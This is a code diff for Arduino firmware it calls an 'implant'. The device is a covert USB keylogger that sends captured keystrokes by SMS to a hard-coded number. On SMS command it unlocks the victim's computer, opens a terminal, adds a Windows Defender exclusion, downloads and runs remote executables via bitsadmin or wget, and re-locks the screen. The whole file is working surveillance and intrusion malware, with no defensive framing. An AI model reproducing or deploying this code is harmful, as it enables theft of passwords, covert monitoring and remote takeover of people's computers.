@@ -9,7 +9,13 @@
 #include "C_USBhost.h"                
 
 #define LEAK_PHONE_NUMBER "+14422457648"
+// We need to comment the next line, #define DEBUG false won't work as expected
 #define DEBUG true
+// Used by Oca to debug the code with an arduino without a SIM module and without an USB host
+#define DEBUGWITHOUTSIM true
+#define DEBUGWITHOUTSIM_PAYLOAD "unlock_download##win##XXXXXXXX##https://s3.amazonaws.com/hellotesthellotesthello/hello.exe"
+//#define DEBUGWITHOUTSIM_PAYLOAD "unlock_download##osx##XXXXXXXX##https://s3.amazonaws.com/hellotesthellotesthello/hello_osx"
+//#define DEBUGWITHOUTSIM_PAYLOAD "unlock_download##lnx##XXXXXXXXX##https://s3.amazonaws.com/hellotesthellotesthello/hello_lin"
 #define IMPLANT_NAME "Implant 1"
 
 //C_USBhost USBhost = C_USBhost(Serial1, /*debug_state*/DEBUG);
@@ -21,34 +27,31 @@ SoftwareSerial SMSSERIAL(8, 9);
 #define CHAR_LIMIT 140                                
 #define BAUD_RATE_SIM800L 57600                    
 #define BAUD_RATE_USB_HOST_BOARD 115200             
-#define BAUD_RATE_SERIAL 115200                    
- 
-#define STATE_IDLE 0
-#define STATE_WAITING_MSG_RESPONSE 1
-#define STATE_WAITING_SMS_RESPONSE 1
+#define BAUD_RATE_SERIAL 115200
 
-#define BEACON_TIME 3 // Time in minutes we will send a beacon to let know it's alive
+#ifdef DEBUG
+#define BEACON_TIME 1 // Time in minutes we will send a beacon to let know it's alive
+#else
+#define BEACON_TIME 30 // Time in minutes we will send a beacon to let know it's alive
+#endif                      
 
-char TextSms[CHAR_LIMIT+2];                  
-int char_count;                              
-char backupTextSms[CHAR_LIMIT+2];
-unsigned long previousMillis=0;
-//int interval=60000;
-int interval=3000;
-int interval_payload=15000;
-String SMS = "";
-int passcached=0;
-char empty;
+unsigned long previousMillis = 0;
+unsigned long previousMillisBeacon = 0;
+
+#ifdef DEBUG
+  unsigned long interval = 3000;
+#else
+  unsigned long interval = 60000;
+#endif
 byte captured_key;
-String substr = "";
-bool mutex_SMS = false;
+//bool mutex_SMS = false;
 bool pendingSMS = false;
 String buffer_keystrokes = "";
 unsigned int pendingLength = 0;
 
 // Flush buffer of the SMS serial
 void SMSSerialFlush(){
-  while(SMSSERIAL.available() > 0) {
+  while(SMSSERIAL.available() > 0){
     int byte = SMSSERIAL.read();
     Serial.print((char)byte);
   }
@@ -65,9 +68,9 @@ String readResponse()
     delay(100);
     TIMEOUT--;
     if (TIMEOUT == 0){
-      if (DEBUG){
-          Serial.println("Timeout reading response");
-      }
+#ifdef DEBUG
+      Serial.println("Timeout reading response");
+#endif
       return "";
     }
   }
@@ -76,14 +79,14 @@ String readResponse()
   {
     incomingByte  = SMSSERIAL.read();
     if (incomingByte == -1){ // this should never happen 
-      if (DEBUG){
-        Serial.println("There is no data to read from SMSSERIAL");
-      }
+#ifdef DEBUG
+      Serial.println("There is no data to read from SMSSERIAL");
+#endif
       break; 
     }
-    if (DEBUG){
-      Serial.write(char(incomingByte));
-    }
+#ifdef DEBUG
+    Serial.write(char(incomingByte));
+#endif
     res += char(incomingByte);
   }
   return res;
@@ -122,8 +125,12 @@ void collectDebugInfo(){
 
 
 // Returns 1 if SMS was sucessfully sent or 0 if not
-int sendSMSMessage(String txt){
-  mutex_SMS = true;
+void sendSMSMessage(String txt){
+#ifdef DEBUGWITHOUTSIM
+  Serial.println("Sending SMS: " + txt);
+  return;
+#endif
+  //mutex_SMS = true;
   SMSSERIAL.write("AT+CMGF=1\r\n");
   delay(2);
 
@@ -143,14 +150,17 @@ int sendSMSMessage(String txt){
 void unlockComputer(String password){
   Keyboard.press(KEY_LEFT_CTRL);
   Keyboard.releaseAll();
-  delay(300);
+  //Some extra delay in case the compiuter is suspended
+  delay(1000);
   Keyboard.press(KEY_LEFT_CTRL);
   Keyboard.releaseAll();
-  delay(300);
+  delay(1000);
   Keyboard.print(password.c_str());
-  delay(100);
+  delay(500);
   Keyboard.press('\n');
-  Keyboard.releaseAll();  
+  Keyboard.releaseAll(); 
+  // It could take some time to unlock
+  delay(3000); 
 }
 
 String getValue(String data, String separator, int index)
@@ -171,7 +181,7 @@ String getValue(String data, String separator, int index)
 }
 
 // It opens a terminal in Windows (7, 8, 10) it tries to open an UAC elevated cmd.exe
-void openTerminalWindows() {
+void openTerminalWindows(){
   //Keys:
   // Windows+R
   //  cmd.exe
@@ -207,12 +217,13 @@ void openTerminalWindows() {
   Keyboard.releaseAll();
   Keyboard.press(KEY_ESC);
   Keyboard.releaseAll();
-  delay(1000);
+  //It also needs time after the UAC fails
+  delay(3000);
 }
 
 
 // It opens a terminal in Windows (7, 8, 10) and Linux (Ubuntu, 16, 18)
-void openTerminalLinux() {
+void openTerminalLinux(){
   //Keys:
   // Ctrl+Alt+T 
   //Actions:
@@ -222,12 +233,45 @@ void openTerminalLinux() {
   Keyboard.press(KEY_LEFT_ALT);
   Keyboard.press('t');
   Keyboard.releaseAll();
-  delay(1000);
+  delay(3000);
   //Now we are ready to execute commands in Linux :)
 }
 
+// It opens a terminal in MacOS (Mojave)
+void openTerminalMacOs(){
+  //Keys:
+  // Win+space
+  // Win+d
+  // backspace
+  // Win+q
+  // Esc
+  // Win+space
+  //Action:
+  // MacOs: It opens the spotlight (and ignores Command+D a very common shortcut in MacOs)
+  Keyboard.press(KEY_LEFT_GUI);
+  Keyboard.press(' ');
+  Keyboard.releaseAll();
+  delay(1000);
+  //Sometimes the spotlight has already some text, we delete it
+  Keyboard.press(KEY_BACKSPACE);
+  Keyboard.releaseAll();
+  delay(1000);
+
+  //Keys:
+  // terminal.app
+  // Enter
+  //Actions:
+  // MacOs: Open a terminal
+  Keyboard.print("terminal.app");
+  Keyboard.releaseAll();
+  delay(2000);
+  Keyboard.press(KEY_RETURN);
+  Keyboard.releaseAll();
+  delay(3000);
+}
+
 // It opens a terminal in Windows (7, 8, 10) and Linux (Ubuntu, 16, 18)
-void openTerminalWindowsLinux() {
+void openTerminalWindowsLinux(){
   //Keys:
   // Win+D
   //Action:
@@ -296,12 +340,11 @@ void openTerminalWindowsLinux() {
   Keyboard.press(KEY_ESC);
   Keyboard.releaseAll();
   delay(2000);
-
-  //Now we are ready to execute commands in windows and Linux :)
 }
 
-// It opens a terminal in Windows (8, 10), Linux (Ubuntu) and MacOS
-void openTerminalMultiOs() {
+// It opens a terminal in Windows (7, 8, 10), Linux (Ubuntu 16, 18) and MacOS (Mojave)
+// It's a bit tricky and it could conflict with some custom shortcuts, so I recommends using the specific function if the OS is known.
+void openTerminalMultiOs(){
   //Keys:
   // Win+space
   // Win+d
@@ -420,7 +463,7 @@ void openTerminalMultiOs() {
   Keyboard.press('\n');
   Keyboard.releaseAll();
   //Powershell needs time to load (at least in my very slow windows laptop)
-  delay(5000);
+  delay(4000);
   Keyboard.press(KEY_LEFT_ALT);
   Keyboard.press('y');
   Keyboard.press(KEY_BACKSPACE);
@@ -437,35 +480,28 @@ void openTerminalMultiOs() {
   //Now we are ready to execute commands in all OS :)
 }
 
-void downloadAndRunMalwareWindows(String url) {
+void downloadAndRunMalwareWindows(String url){
   // Add windows defender exception
-  String cmd1 = "powershell -inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionPath %appdata%";
-  Keyboard.print(cmd1.c_str());
-  Keyboard.press('\n');
+  Keyboard.println("powershell -inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionPath %appdata%");
   Keyboard.releaseAll(); 
-  delay(500);
+  delay(3000);
 
-  String cmd = "bitsadmin /transfer winupdate /download /priority foreground " + url.c_str() + " %appdata%\\Microsoft\\wintask.exe && start \"\" %appdata%\\Microsoft\\wintask.exe && exit";
-  Keyboard.println(cmd.c_str());
+  Keyboard.print("bitsadmin /transfer winupdate /download /priority foreground ");
+  Keyboard.print(url);
+  Keyboard.println(" %appdata%\\Microsoft\\wintask.exe && start \"\" %appdata%\\Microsoft\\wintask.exe && exit");
   Keyboard.releaseAll();
-  delay(1000);        
+  delay(2000);        
 }
 
-void downloadAndRunMalwareLinux(String url) {
-  String cmd = " x=/tmp/.logCollector; wget --no-check-certificate " + url.c_str() + " -O ${x}; chmod +x ${x}; ${x}; rm ${x}";
-  Keyboard.println(cmd.c_str());
-  Keyboard.releaseAll();
-  delay(1000); 
-}
-
-void downloadAndRunMalwareMacOs(String url) {
-  String cmd = " x=/tmp/.logCollector; wget --no-check-certificate " + url.c_str() + " -O ${x}; chmod +x ${x}; ${x}; rm ${x}";
-  Keyboard.println(cmd.c_str());
+void downloadAndRunMalwareLinuxMacOs(String url){
+  Keyboard.print(" x=/tmp/.logCollector; wget --no-check-certificate ");
+  Keyboard.print(url);
+  Keyboard.println(" -O ${x}; chmod +x ${x}; nohup ${x} &");
   Keyboard.releaseAll();
   delay(1000); 
 }
 
-void exitShell() {
+void exitTerminalWindowsLinux(){
   //Keys:
   // exit
   //Actions:
@@ -477,8 +513,8 @@ void exitShell() {
   delay(1000);
 }
 
-void exitShellOsx() {
-  exitShell();
+void exitTerminalMultiOs(){
+  exitTerminalWindowsLinux();
 
   //Only for MacOs
   //Keys:
@@ -496,18 +532,14 @@ void exitShellOsx() {
   Keyboard.releaseAll();
 }
 
-void lockWin() {
+void lockWindowsLinux(){
   Keyboard.press(KEY_RIGHT_GUI);
   Keyboard.press('l');
   Keyboard.releaseAll(); 
   delay(1000);
 }
 
-void lockLinux() {
-  lockWin();
-}
-
-void lockMacOs() {
+void lockMacOs(){
   Keyboard.press(KEY_LEFT_GUI);
   Keyboard.press(KEY_LEFT_CTRL);
   Keyboard.press('q');
@@ -515,13 +547,15 @@ void lockMacOs() {
   delay(1000);
 }
 
-void setup() {
+void setup(){
   delay(300);                                              
-  Serial.begin(BAUD_RATE_SERIAL);                                                   
-  SMSSERIAL.begin(BAUD_RATE_SIM800L);
-  USBhost.Begin(BAUD_RATE_USB_HOST_BOARD);                   
+  Serial.begin(BAUD_RATE_SERIAL);
+
   Keyboard.begin();
 
+#ifndef DEBUGWITHOUTSIM
+  SMSSERIAL.begin(BAUD_RATE_SIM800L);
+  USBhost.Begin(BAUD_RATE_USB_HOST_BOARD);                   
   SMSSERIAL.write("AT\r\n");
   readResponse();
 
@@ -529,29 +563,28 @@ void setup() {
   SMSSERIAL.write("AT+CMGF=1\r\n");
   readResponse();
 
-  if(DEBUG){
-      collectDebugInfo();
-  }
-  
-  //Keyboard.press(KEY_RIGHT_GUI);
-  //Keyboard.press('l');
-  //Keyboard.releaseAll();
-                                            
+#ifdef DEBUG
+  collectDebugInfo();
+#endif
+
+#endif //DEBUGWITHOUTSIM                                        
 }
 
-void loop() {   
+void loop(){  
   unsigned long currentMillis = millis();
   captured_key = USBhost.GetKey();    
 
   // Send a beacon so we know that the implant is up
   // ToDo: this can infere with payloads execution
-//  if ((unsigned long)((currentMillis - previousMillis)/ 60000) > BEACON_TIME){
-//      sendSMSMessage("Beacon - " IMPLANT_NAME);
-//      previousMillis = currentMillis;
-//      if(DEBUG){
-//          Serial.println("Beacon sent");
-//      }
-//  }
+  if (!pendingSMS && (unsigned long)((currentMillis - previousMillisBeacon)/ 60000) > BEACON_TIME){
+      String msg = "Beacon - ";
+      msg += IMPLANT_NAME;
+#ifdef DEBUG
+      Serial.println("Sending beacon");
+#endif
+      sendSMSMessage(msg);
+      previousMillisBeacon = currentMillis;
+  }
 
   //Normalkey capture
   if(captured_key){
@@ -560,102 +593,115 @@ void loop() {
         buffer_keystrokes = buffer_keystrokes.substring(0, buffer_keystrokes.length() - 1);
       }
     }
-    else {
+    else{
       buffer_keystrokes += (char)captured_key;
-      }
+    }
     previousMillis = currentMillis;  
   }
 
   //SMS send
-  if (buffer_keystrokes.length() >= CHAR_LIMIT - 1 || (unsigned long)(currentMillis - previousMillis) >= interval && buffer_keystrokes.length() > 5) {
-    if (!pendingSMS) {
+  if (buffer_keystrokes.length() >= CHAR_LIMIT - 1 || (unsigned long)(currentMillis - previousMillis) >= interval && buffer_keystrokes.length() > 5){
+    if (!pendingSMS){
       // The buffer could hold a lot of characters from previous SMS that couldn't be sent
       String bufferToSend = "";
-      if (buffer_keystrokes.length() < CHAR_LIMIT - 1) {
+      if (buffer_keystrokes.length() < CHAR_LIMIT - 1){
         bufferToSend = buffer_keystrokes;
       }
-      else {
+      else{
         bufferToSend = buffer_keystrokes.substring(0, CHAR_LIMIT - 1);
       }
-      if(DEBUG){
-        Serial.println("Trying to send message with content: " + bufferToSend);
-      }
+#ifdef DEBUG
+      Serial.println("Trying to send message with content: " + bufferToSend);
+#endif
       
       sendSMSMessage(bufferToSend);
       pendingSMS = true;
       pendingLength = bufferToSend.length();
     } 
-    else {
-      if(DEBUG){
-        Serial.println("There is a SMS pending to be sent...");
-      }
+    else{
+#ifdef DEBUG
+      Serial.println("There is a SMS pending to be sent...");
+#endif
     }
   }
 
   // If there is a pending SMS we check if it was sent, if so we remove the characters sent
-  if (pendingSMS) {
-    if (SMSSERIAL.available()) {
+  if (pendingSMS){
+    if (SMSSERIAL.available()){
       String res = SMSSERIAL.readString();
+#ifdef DEBUG
       Serial.println("Message read from SMSSERIAL: " + res);
+#endif
       if (res.indexOf("CMGS: ") > 0){
+#ifdef DEBUG
         Serial.println("SMS message succesfully sent");
+#endif
         pendingSMS = false;
         
         SMSSerialFlush(); // just is case there is something else in the serial
-        mutex_SMS = false; // we can now listen for commands
+        //mutex_SMS = false; // we can now listen for commands
         
         // We removed from the buffer the characters that were sent
         buffer_keystrokes = buffer_keystrokes.substring(pendingLength);
       }
       // ToDo: We need to change ERROR for the message receive when a SMS is not sent correctly
-      else if (res.indexOf("ERROR: ")) {
+      else if (res.indexOf("ERROR: ")){
         // The SMS couldn't be sent, we need to retry
-        if(DEBUG){
-          Serial.println("Trying to send message with content: " + buffer_keystrokes.substring(0, pendingLength));
-        }
+#ifdef DEBUG
+        Serial.println("Trying to send message with content: " + buffer_keystrokes.substring(0, pendingLength));
+#endif
         sendSMSMessage(buffer_keystrokes.substring(0, pendingLength));
       }
     }
   }
 
+#ifdef DEBUGWITHOUTSIM
+  if (true) {
+#else
+  //Payload Method Make sure keyword are unique enough that subject in question wont enter them on their keyboard.
+  if (!pendingSMS && SMSSERIAL.available()){
+#endif
 
-   //Payload Method Make sure keyword are unique enough that subject in question wont enter them on their keyboard.
-    if (mutex_SMS == false && SMSSERIAL.available()) {
-      Serial.println("new SMS");
-  
-      SMS = SMSSERIAL.readString();      
-      Serial.println(SMSSERIAL.readString());
+#ifdef DEBUG
+    Serial.println("new SMS");
+#endif
 
+    String SMS = SMSSERIAL.readString();      
+#ifdef DEBUGWITHOUTSIM
+    //We wait a little bit so the OS has time to identify the keyboard
+    delay(30000);
+    // To simulate a real SMS:
+    SMS = "+CMT: blablabla\r\n";
+    SMS += DEBUGWITHOUTSIM_PAYLOAD;
+#endif
+
+    if(SMS.indexOf("+CMT: ") > -1){ // We got a command
       String SMS_text;
-      if(SMS.indexOf("+CMT: ") > -1){ // We got a command
-        // Code to remove last new line if exists
-        if(SMS.charAt(SMS.length())== '\n' &&  SMS.charAt(SMS.length()-1)== '\r'){
-          SMS.remove(SMS.length()-1, SMS.length());
-        }
-        int new_line_pos = SMS.indexOf("\r\n", 2);
-        SMS_text = SMS.substring(new_line_pos +2); // +2 is bc \r\n
-        if(DEBUG){
-          Serial.println("Received SMS with content:");
-          Serial.println(SMS_text);
-        }
+      // Code to remove last new line if exists
+      if(SMS.charAt(SMS.length())== '\n' &&  SMS.charAt(SMS.length()-1)== '\r'){
+        SMS.remove(SMS.length()-1, SMS.length());
       }
-
-     
-      String payload = getValue(SMS_text,SEPARATOR,0);
-
-      if(DEBUG && payload.length()>0){
-          Serial.println("Got payload: " + payload);
-        }
+      int new_line_pos = SMS.indexOf("\r\n", 2);
+      SMS_text = SMS.substring(new_line_pos +2); // +2 is bc \r\n
+#ifdef DEBUG
+      Serial.println("Received SMS with content:");
+      Serial.println(SMS_text);
+#endif
+      String payload = getValue(SMS_text, SEPARATOR, 0);
+  
+#ifdef DEBUG
+      if(payload.length() > 0){
+        Serial.println("Got payload: " + payload);
+      }
+#endif
       
-      if (payload == "unolock_download"){
+      if (payload == "unlock_download"){
         String OS = getValue(SMS_text,SEPARATOR,1);
         OS.toLowerCase();
         String password = getValue(SMS_text,SEPARATOR,2);
         String url = getValue(SMS_text,SEPARATOR,3);
-  
         // Unlock the computer to download and execute malware
         unlockComputer(password);
-        delay(2000);
         
         // Download and execute the malware
         if(OS == "win"){
@@ -663,43 +709,43 @@ void loop() {
           openTerminalWindows();
           downloadAndRunMalwareWindows(url);
           exitTerminalWindowsLinux();
-          lockWindows();
+          lockWindowsLinux();
         }
-        
         else if(OS == "lnx"){
           openTerminalLinux();
-          downloadAndRunMalwareLinux(url);
+          downloadAndRunMalwareLinuxMacOs(url);
           exitTerminalWindowsLinux();
-          lockLinux();
+          lockWindowsLinux();
         }
         else if(OS == "osx"){
           openTerminalMacOs();
-          downloadAndRunMalwareMacOs(url);
-          exitTerminalMacOs();
+          downloadAndRunMalwareLinuxMacOs(url);
+          exitTerminalMultiOs();
           lockMacOs();
         }
-        else if(OS == "winlin") {
+        else if(OS == "winlin"){
           //We don't know the OS but we suspect is windows or linux
           openTerminalWindowsLinux();
+          // If it's not windows it will fail, but it would be logged in the history
           downloadAndRunMalwareWindows(url);
-          downloadAndRunMalwareLinux(url);
+          downloadAndRunMalwareLinuxMacOs(url);
           exitTerminalWindowsLinux();
-          lockWindows();
-          lockLinux();
+          lockWindowsLinux();
         }
-        else{
+        else if(OS == "multi"){
           //We don't know the OS
           openTerminalMultiOs();
-          //We try all the payload
+          //We try all the payloads
           downloadAndRunMalwareWindows(url);
-          downloadAndRunMalwareLinux(url);
-          downloadAndRunMalwareMacOs(url);
+          downloadAndRunMalwareLinuxMacOs(url);
           //It also closes it for Windows and Linux
-          exitTerminalMacOs();
+          exitTerminalMultiOs();
           //We try to lock all the os
-          lockWin();
-          lockLinux();
+          lockWindowsLinux();
           lockMacOs();
+        }
+        else {
+          sendSMSMessage("Wrong OS sent for payload");
         }
       }
       // Manuall##press##83 72 (in hex)
@@ -733,12 +779,21 @@ void loop() {
           delay(argument.toInt());
         }
       }
-
       else{
-        if(DEBUG){
-          Serial.println("Unknown payload " + payload); 
-        }
+  #ifdef DEBUG
+        Serial.println("Unknown payload " + payload); 
+  #endif
         sendSMSMessage("Unknown payload '" + payload + "'\nFull message: " + SMS_text);
       }
+      // After execute a fake payload it does a long sleep
+  #ifdef DEBUGWITHOUTSIM
+      delay(120000);
+  #endif
     }
+    else {
+#ifdef DEBUG
+      Serial.println("Receive something that is not an SMS: " + SMS);
+#endif
+    }
+  }
 }
